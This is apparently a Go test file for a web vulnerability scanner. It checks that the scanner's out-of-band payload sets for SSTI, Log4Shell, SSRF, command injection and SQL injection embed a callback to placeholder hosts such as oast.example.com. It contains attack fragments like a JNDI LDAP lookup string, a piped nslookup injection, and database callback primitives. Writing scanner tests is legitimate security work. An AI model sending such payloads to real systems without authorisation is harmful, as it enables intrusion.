package scanner

import (
	"strings"
	"testing"
)

func TestSSTIOOBPayloadsCoverEngines(t *testing.T) {
	cb := "http://oast.example.com/oob/rcnoob0123456789"
	ps := sstiOOBPayloads(cb)
	if len(ps) < 8 {
		t.Fatalf("expected a broad SSTI set, got %d", len(ps))
	}
	// every payload must embed the callback so a hit correlates.
	for _, p := range ps {
		if !strings.Contains(p, cb) {
			t.Fatalf("SSTI payload missing callback: %q", p)
		}
	}
	// key engine markers must be represented.
	joined := strings.Join(ps, "\n")
	for _, marker := range []string{
		"__globals__",                         // Jinja2
		"__import__",                          // Mako
		"filter('system')",                    // Twig
		"{php}",                               // Smarty
		"child_process",                       // Nunjucks
		"<%=",                                 // ERB
		"freemarker.template.utility.Execute", // Freemarker
		"java.lang.Runtime",                   // SpEL/Java EL
	} {
		if !strings.Contains(joined, marker) {
			t.Errorf("SSTI set missing engine marker %q", marker)
		}
	}
}

func TestLog4ShellParamPayloads(t *testing.T) {
	cb := "oast.example.com:1389/rcnoob0123456789"
	ps := log4ShellParamPayloads(cb)
	if len(ps) < 3 {
		t.Fatalf("expected multiple Log4Shell variants, got %d", len(ps))
	}
	joined := strings.Join(ps, "\n")
	// plain, case-mangled bypass, and RMI variants must all be present.
	for _, want := range []string{"${jndi:ldap://" + cb, "lower:j", "rmi://" + cb, "dns://" + cb} {
		if !strings.Contains(joined, want) {
			t.Errorf("Log4Shell set missing %q", want)
		}
	}
}

func TestSSRFOOBPayloadsBypasses(t *testing.T) {
	host := "oast.example.com"
	cb := "http://" + host + "/oob/rcnoob0123456789"
	ps := ssrfOOBPayloads(cb, host, "https://allowed.example/image.png", "")
	joined := strings.Join(ps, "\n")
	// direct, https, protocol-relative, and fragment-bypass forms.
	for _, want := range []string{cb, "https://" + host + "/oob/", "//" + host + "/oob/", cb + "#"} {
		if !strings.Contains(joined, want) {
			t.Errorf("SSRF set missing variant %q; got %v", want, ps)
		}
	}
	// With no DNS zone, no bare-host DNS variant is emitted.
	if strings.Contains(joined, "http://rcnoob0123456789./") {
		t.Errorf("unexpected DNS variant without a zone: %v", ps)
	}
}

func TestSSRFOOBPayloadsDNSChannel(t *testing.T) {
	host := "oast.example.com"
	token := "rcnoob0123456789abcdef0123"
	cb := "http://" + host + "/oob/" + token
	dnsHost := token + ".oob.example.com"
	joined := strings.Join(ssrfOOBPayloads(cb, host, "", dnsHost), "\n")
	// The token-bearing DNS host must appear so a DNS-only-egress target is caught.
	for _, want := range []string{"http://" + dnsHost + "/", "https://" + dnsHost + "/"} {
		if !strings.Contains(joined, want) {
			t.Errorf("SSRF DNS channel missing %q; got %s", want, joined)
		}
	}
}

func TestSSRFOOBPayloadsPreserveHTTPSPath(t *testing.T) {
	cb := "https://oob.example.test/oob/rcnoob0123456789abcdef0123"
	got := ssrfOOBPayloads(cb, "oob.example.test", "https://allowed.example/path", "")
	for _, bad := range []string{"https://oob.example.test//oob.example.test/", "//oob.example.test//oob.example.test/"} {
		for _, payload := range got {
			if strings.Contains(payload, bad) {
				t.Fatalf("malformed HTTPS callback payload %q", payload)
			}
		}
	}
	if !containsString(got, "//oob.example.test/oob/rcnoob0123456789abcdef0123") {
		t.Fatalf("missing protocol-relative HTTPS callback path: %#v", got)
	}
}

func TestRCEOOBDNSFallbackUsesHostOnly(t *testing.T) {
	got := rceOOBPayloads("https://oob.example.test/oob/rcnoob0123456789abcdef0123", "")
	if !containsString(got, "| nslookup oob.example.test") {
		t.Fatalf("DNS fallback must contain host only: %#v", got)
	}
	for _, payload := range got {
		if strings.HasPrefix(payload, "| nslookup ") && strings.Contains(strings.TrimPrefix(payload, "| nslookup "), "/") {
			t.Fatalf("DNS fallback contains an invalid URL path: %q", payload)
		}
	}
}

func TestRCEOOBDNSChannelUsesTokenName(t *testing.T) {
	token := "rcnoob0123456789abcdef0123"
	dnsHost := token + ".oob.example.com"
	got := rceOOBPayloads("https://oob.example.test/oob/"+token, dnsHost)
	// With a zone, the nslookup targets the token-bearing name so a DNS-only RCE
	// callback is attributable to this exact probe.
	if !containsString(got, "| nslookup "+dnsHost) {
		t.Fatalf("DNS channel must use the token-bearing name: %#v", got)
	}
	// And it must never contain an HTTP path in a nslookup arg.
	for _, payload := range got {
		if strings.Contains(payload, "nslookup ") {
			arg := payload[strings.Index(payload, "nslookup ")+len("nslookup "):]
			if strings.Contains(arg, "/") {
				t.Fatalf("nslookup arg must be a bare host, got %q", payload)
			}
		}
	}
}

func TestSQLiOOBStaysWithinDatabaseProof(t *testing.T) {
	cb := "http://oast.example.com/oob/rcnoob0123456789"
	joined := strings.Join(sqliOOBPayloads(cb, "oast.example.com", ""), "\n")
	if strings.Contains(joined, "TO PROGRAM") || strings.Contains(joined, "xp_cmdshell") {
		t.Fatalf("SQLi confirmation must not execute operating-system commands: %s", joined)
	}
	// Oracle/MSSQL/MySQL DB-native primitives remain.
	for _, want := range []string{"UTL_HTTP.REQUEST", "xp_dirtree", "LOAD_FILE"} {
		if !strings.Contains(joined, want) {
			t.Errorf("SQLi OOB set regressed, missing %q", want)
		}
	}
	// No DNS zone → no DNS-only Oracle primitive and the UNC host is the callback host.
	if strings.Contains(joined, "UTL_INADDR") {
		t.Errorf("UTL_INADDR must only appear when a DNS zone is configured: %s", joined)
	}
}

func TestSQLiOOBDNSChannel(t *testing.T) {
	token := "rcnoob0123456789abcdef0123"
	cb := "http://oast.example.com/oob/" + token
	dnsHost := token + ".oob.example.com"
	joined := strings.Join(sqliOOBPayloads(cb, "oast.example.com", dnsHost), "\n")
	// The UNC/LOAD_FILE/xp_dirtree host must be the token-bearing DNS name so the
	// DB's DNS resolution is caught even with no SMB/HTTP egress.
	if !strings.Contains(joined, `\\`+dnsHost+`\`) {
		t.Errorf("UNC host must be the DNS-catchable name; got %s", joined)
	}
	// Oracle DNS-only exfil primitive must be present.
	if !strings.Contains(joined, "UTL_INADDR.GET_HOST_ADDRESS('"+dnsHost+"')") {
		t.Errorf("SQLi DNS channel missing Oracle UTL_INADDR primitive; got %s", joined)
	}
	// Still strictly DB-native — never an OS command.
	if strings.Contains(joined, "xp_cmdshell") || strings.Contains(joined, "TO PROGRAM") {
		t.Fatalf("DNS channel must not introduce OS-command execution: %s", joined)
	}
}
